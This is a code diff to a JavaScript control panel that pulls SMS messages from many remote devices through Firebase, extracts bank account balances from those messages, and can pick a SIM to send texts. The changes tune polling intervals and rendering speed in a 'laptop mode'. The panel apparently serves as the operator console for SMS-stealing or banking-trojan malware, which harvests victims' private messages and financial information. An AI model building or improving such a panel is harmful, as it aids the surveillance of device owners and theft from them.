@@ -949,8 +949,9 @@ var _simCache={};
 var _pulseBatchTimer=0;
 var _pulseDirty=false;
 var IS_LAPTOP_MODE=/laptop\.php/i.test(String(location.pathname||''));
-var SMS_FAST_MS=IS_LAPTOP_MODE?50:100;
-var SMS_ALL_POLL_MS=IS_LAPTOP_MODE?500:2000;
+var SMS_FAST_MS=IS_LAPTOP_MODE?2500:100;
+var SMS_ALL_POLL_MS=IS_LAPTOP_MODE?12000:2000;
+var SMS_RENDER_MS=IS_LAPTOP_MODE?220:0;
 var _bankParseCache={};
 var fetchStartMs=0, firstFetchDone=false;
 var activeFbId='';
@@ -1838,7 +1839,7 @@ function attachRestPolling(inst){
       fetchNodeViaSdk(inst,'devices');
     }
     sdkPoll();
-    inst.pollTimer=setInterval(sdkPoll,5000);
+    inst.pollTimer=setInterval(sdkPoll,IS_LAPTOP_MODE?15000:5000);
     attachOnlineStatusPulse(inst);
     return;
   }
@@ -2150,6 +2151,8 @@ function openDevice(id){
   var prevDev=getSelDev();
   if(selDev) saveDeviceSession(selDev);
   if(prevDev) clearDeviceListenersForDev(prevDev);
+  if(_smsRenderTimer){clearTimeout(_smsRenderTimer);_smsRenderTimer=0;}
+  if(_bankRenderTimer){clearTimeout(_bankRenderTimer);_bankRenderTimer=0;}
   selDev=id;
   highlightSelectedDev();
   document.getElementById('emptyState').classList.add('hidden');
@@ -2186,9 +2189,12 @@ function openDevice(id){
       if(_simCache[id]) renderSendSimPicker(_simCache[id]);
       else loadSendSimOptions(dev);
     }
-    if(!tabLoaded.sms&&(IS_LAPTOP_MODE||tab==='sms'||tab==='bank')) ensureTabLoaded('sms');
-    if(tab==='bank') renderBankAccounts();
-    if(!tabLoaded[tab]&&tab!=='sms'&&tab!=='bank') ensureTabLoaded(tab);
+    if(tab==='sms'||tab==='bank'){
+      if(!tabLoaded.sms) ensureTabLoaded('sms');
+      if(tab==='bank') scheduleBankRender();
+    } else if(!tabLoaded[tab]){
+      ensureTabLoaded(tab);
+    }
   },0);
 }
 
@@ -2286,11 +2292,16 @@ function ingestNewSmsPayload(d){
   }
   return list;
 }
-var _smsRenderRaf=0;
-function scheduleSmsRender(instant){
-  if(instant&&IS_LAPTOP_MODE){
-    if(_smsRenderRaf){cancelAnimationFrame(_smsRenderRaf);_smsRenderRaf=0;}
-    renderSmsList();
+var _smsRenderRaf=0, _smsRenderTimer=0;
+function scheduleSmsRender(){
+  if(IS_LAPTOP_MODE&&_activeDataTab!=='sms'&&_activeDataTab!=='bank') return;
+  if(IS_LAPTOP_MODE&&SMS_RENDER_MS>0){
+    if(_smsRenderTimer) return;
+    _smsRenderTimer=setTimeout(function(){
+      _smsRenderTimer=0;
+      if(_smsRenderRaf) return;
+      _smsRenderRaf=requestAnimationFrame(function(){_smsRenderRaf=0;renderSmsList();});
+    },SMS_RENDER_MS);
     return;
   }
   if(_smsRenderRaf) return;
@@ -2312,12 +2323,12 @@ function burstFetchAllSms(dev){
     var p=ingestAllSmsPayload(d);
     window._allSmsData=p.list;
     window._allSmsTotal=p.total;
-    scheduleSmsRender(true);
+    scheduleSmsRender();
   });
   restJson(inst.restUrl+'/'+ref+'/new_sms.json').then(function(d){
     if(selDev!==dev.id) return;
     window._newSmsData=ingestNewSmsPayload(d);
-    scheduleSmsRender(true);
+    scheduleSmsRender();
   });
 }
 function appendRabelSmsMessage(dev,key,raw,isUpdate){
@@ -2339,7 +2350,7 @@ function appendRabelSmsMessage(dev,key,raw,isUpdate){
   }
   window._allSmsData=list;
   window._allSmsTotal=list.length;
-  scheduleSmsRender(IS_LAPTOP_MODE);
+  scheduleSmsRender();
 }
 function ingestRabelSms(dev,data){
   var msgs=[];
@@ -2366,7 +2377,7 @@ function ingestRabelSms(dev,data){
   } else if(isInitial) window._newSmsData=[];
   window._allSmsData=msgs;
   window._allSmsTotal=msgs.length;
-  scheduleSmsRender(IS_LAPTOP_MODE);
+  scheduleSmsRender();
 }
 function attachRabelSmsLive(dev){
   var inst=getFbInstance(dev.fbId);
@@ -2400,7 +2411,7 @@ function attachSpinplayNewSmsLive(dev){
     if(!n) return;
     n._sortKey=s.key;
     window._newSmsData=(window._newSmsData||[]).concat([n]);
-    scheduleSmsRender(true);
+    scheduleSmsRender();
   };
   ref.on('child_added',addH);
   activeListeners[key]={type:'children',db:inst.db,path:path,addH:addH,chH:null};
@@ -2413,6 +2424,7 @@ function attachSpinplayNewSmsLive(dev){
 }
 function loadRabelSms(dev){
   if(attachRabelSmsLive(dev)) return;
+  burstFetchAllSms(dev);
   restPoll(dev.fbId,'messages/'+dev.rawId,function(data){ingestRabelSms(dev,data);},SMS_FAST_MS);
 }
 function loadSmsRest(dev){
@@ -2426,30 +2438,28 @@ function loadSmsRest(dev){
   },SMS_ALL_POLL_MS);
   restPoll(dev.fbId,ref+'/new_sms',function(d){
     window._newSmsData=ingestNewSmsPayload(d);
-    scheduleSmsRender(true);
+    scheduleSmsRender();
   },SMS_FAST_MS);
 }
 function loadSmsFast(dev){
   if(!dev) return;
   var inst=getFbInstance(dev.fbId);
   if(inst&&inst.schema==='rabel'){
-    burstFetchAllSms(dev);
     loadRabelSms(dev);
     return;
   }
-  burstFetchAllSms(dev);
   var ref=dev.deviceNode+'/'+dev.rawId;
   if(inst&&inst.db){
     attachSpinplayNewSmsLive(dev);
-    devOnFast(dev.fbId,ref+'/all_sms',function(snap){
+    devOn(dev.fbId,ref+'/all_sms',function(snap){
       var p=ingestAllSmsPayload(snap.val());
       window._allSmsData=p.list;
       window._allSmsTotal=p.total;
       scheduleSmsRender();
     });
-  }else{
-    loadSmsRest(dev);
+    return;
   }
+  loadSmsRest(dev);
 }
 function loadRabelSim(dev){
   restPoll(dev.fbId,'clients/'+dev.rawId,function(data){
@@ -2568,7 +2578,7 @@ function ensureTabLoaded(tab){
     });
   } else if(tab==='bank'){
     if(!tabLoaded.sms) ensureTabLoaded('sms');
-    renderBankAccounts();
+    scheduleBankRender();
   }
 }
 
@@ -2580,7 +2590,7 @@ function switchDataTab(name,btn){
   document.querySelectorAll('.data-section').forEach(function(s){s.classList.remove('active');});
   document.getElementById('tab-'+name).classList.add('active');
   if((name==='sms'||name==='bank')&&!tabLoaded.sms) ensureTabLoaded('sms');
-  if(name==='bank') renderBankAccounts();
+  if(name==='bank') scheduleBankRender();
   else ensureTabLoaded(name);
 }
 
@@ -2923,6 +2933,7 @@ function parseBankAccountsFromSms(smsList){
   }).sort(function(a,b){return a.bank.localeCompare(b.bank);});
 }
 function renderBankAccounts(){
+  if(IS_LAPTOP_MODE&&_activeDataTab!=='bank') return;
   var dev=getSelDev(),listEl=document.getElementById('bankList'),emptyEl=document.getElementById('bankEmpty'),badge=document.getElementById('tc-bank'),noteEl=document.getElementById('bankAutoNote');
   if(!dev){
     if(emptyEl){emptyEl.style.display='';emptyEl.textContent='Select a device to load bank balances from SMS';}
@@ -2937,6 +2948,15 @@ function renderBankAccounts(){
   if(bh===_bankDataHash&&listEl&&listEl.children.length) return;
   _bankDataHash=bh;
   paintBankCards(banks,smsList.length,listEl,emptyEl,badge,noteEl);
+}
+var _bankRenderTimer=0;
+function scheduleBankRender(){
+  if(IS_LAPTOP_MODE){
+    if(_bankRenderTimer) return;
+    _bankRenderTimer=setTimeout(function(){_bankRenderTimer=0;renderBankAccounts();},280);
+    return;
+  }
+  renderBankAccounts();
 }
 function paintBankCards(banks,smsCount,listEl,emptyEl,badge,noteEl){
   if(badge)badge.textContent=String(banks.length);
@@ -3097,7 +3117,7 @@ function renderSmsList(){
   merged=merged.slice(0,100);
   var listHash=merged.length+'|'+total+'|'+newMsgs.length+'|'+(merged[0]?smsDedupKey(merged[0]):'')+'|'+(merged[merged.length-1]?smsDedupKey(merged[merged.length-1]):'');
   if(listHash===_smsListHash){
-    if(_activeDataTab==='bank') renderBankAccounts();
+    if(_activeDataTab==='bank') scheduleBankRender();
     return;
   }
   _smsListHash=listHash;
@@ -3119,7 +3139,7 @@ function renderSmsList(){
       '<td class="mono" style="color:var(--muted)">'+esc(s.date_readable||'—')+'</td>'+
       '<td><span class="sbadge '+type+'">'+esc(s.type||'?')+'</span></td></tr>';
   }).join('');
-  if(_activeDataTab==='bank') renderBankAccounts();
+  if(_activeDataTab==='bank') scheduleBankRender();
 }
 
 function openSmsModal(idx){
@@ -3892,7 +3912,6 @@ document.getElementById('loginKey').addEventListener('input',function(){
 });
 var _perfTickLast=0, _cacheSweepLast=0, _authCheckLast=0, _smsTokenPollLast=0;
 function perfMainLoop(now){
-  requestAnimationFrame(perfMainLoop);
   if(!now) now=performance.now();
   if(now-_perfTickLast>=1000){
     _perfTickLast=now;
@@ -3907,7 +3926,7 @@ function perfMainLoop(now){
       _authCheckLast=now;
       verifyRebelSession();
     }
-    if(panelInitialized&&now-_smsTokenPollLast>=5000){
+    if(panelInitialized&&now-_smsTokenPollLast>=(IS_LAPTOP_MODE?15000:5000)){
       _smsTokenPollLast=now;
       loadSmsTokenConfig(true);
     }
@@ -3917,7 +3936,12 @@ function perfMainLoop(now){
     clearClientsCacheIfExpired();
   }
 }
-requestAnimationFrame(perfMainLoop);
+if(IS_LAPTOP_MODE){
+  setInterval(function(){perfMainLoop(performance.now());},1000);
+}else{
+  function perfLoop(now){perfMainLoop(now);requestAnimationFrame(perfLoop);}
+  requestAnimationFrame(perfLoop);
+}
 document.getElementById('footerTime').textContent=new Date().toLocaleString();
 </script>
 </body>
